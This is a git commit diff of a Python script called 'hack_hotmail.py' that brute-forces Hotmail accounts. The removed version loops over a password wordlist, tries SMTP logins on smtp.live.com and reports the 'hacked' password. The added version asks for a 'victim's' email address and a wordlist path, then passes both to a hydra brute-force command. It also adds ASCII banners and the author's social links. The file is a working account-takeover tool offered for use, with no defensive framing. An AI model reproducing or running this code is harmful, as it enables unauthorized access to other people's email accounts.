e3eac67dede13d3e52fffece197fb413dda1ea4d
antqame <39079003+antqame@users.noreply.github.com>
2018-11-27 23:36:32 +0300

    Add files via upload

--- hack_hotmail.py
+++ hack_hotmail.py
@@ -1,67 +1,56 @@
 #!/usr/bin/python
 '''create by ali qassem (antqame) '''
-
+from requests import *
 import smtplib
-from os import system
+import os
+################################################################################
+#colors
+wi = "\033[1;37m"
+rd = "\033[1;31m"
+gr = "\033[1;32m"
+yl = "\033[1;33m"
+bl = "\033[1;34m"
+################################################################################
+def banner():
+    print(rd)+'''  
 
-def main():
-   print '================================================='
-   print 'Author antqame'
-   print'Name_script hack hotmail'
-   print'website http://www.antqame.blogspot.com'
-   print'facebook https://www.facebook.com/ANtqAmE'
-   print''
-   print '================================================='
-   print '               ++++++++++++++++++++              '
-   print '\n                                               '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
-   print '                                                 '
+ 
+ 
+#   .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
+#  | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
+#  | |      __      | || | ____  _____  | || |  _________   | || |    ___       | || |      __      | || | ____    ____ | || |  _________   | |
+#  | |     /  \     | || ||_   \|_   _| | || | |  _   _  |  | || |  .'   '.     | || |     /  \     | || ||_   \  /   _|| || | |_   ___  |  | |
+#  | |    / /\ \    | || |  |   \ | |   | || | |_/ | | \_|  | || | /  .-.  \    | || |    / /\ \    | || |  |   \/   |  | || |   | |_  \_|  | |
+#  | |   / ____ \   | || |  | |\ \| |   | || |     | |      | || | | |   | |    | || |   / ____ \   | || |  | |\  /| |  | || |   |  _|  _   | |
+#  | | _/ /    \ \_ | || | _| |_\   |_  | || |    _| |_     | || | \  `-'  \_   | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |  _| |___/ |  | |
+#  | ||____|  |____|| || ||_____|\____| | || |   |_____|    | || |  `.___.\__|  | || ||____|  |____|| || ||_____||_____|| || | |_________|  | |
+#  | |              | || |              | || |              | || |              | || |              | || |              | || |              | |
+#  | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
+#   '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'                                                        
+    '''
+banner()
+def the_show():
+    print(yl)+'''
 
-main()
+                                     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+                                     !                                   |                                       !
+                                     !-------------------Author : ANtqAmE (ALi Qasseim)--------------------------!
+                                     !                                                                           !
+                                     !-------------Name_script:   hack hotmail             , V 2.0---------------!
+                                     !                                                                           !
+                                     !------------website : http://www.antqame.blogspot.com----------------------!
+                                     !                                                                           !
+                                     !------------facebook :https://www.facebook.com/ANtqAmE---------------------!
+                                     !                                                                           !
+                                     !--------youtube:https://www.youtube.com/channel/UC1QRVK_K4jWPDXm798orw-g---!
+                                     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+    '''
+the_show()
 print '[1] start the attack'
 print '[2] exit'
 option = input('==>')
 if option == 1:
-   file_path = raw_input('path of passwords file :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP('smtp.live.com', 587)
-    server.ehlo()
-    server.starttls()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         print '\n'
-         print '[+] This email Has Been Hacked Password ==> :' + password + '     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            print '[+] this email has been hacked, password ==> :' + password + '     ^_^'
-
-            break
-         else:
-            print '[!] password not found => ' + password
-login()
+   email = str(raw_input(" Enter Email victim's : "))
+   password = str(raw_input(" Enter path of wordlist : "))
+   os.system("hydra smtp.live.com smtp -l %s -P %s -w 1 -s 587 -sS -v -V" % (email,password))
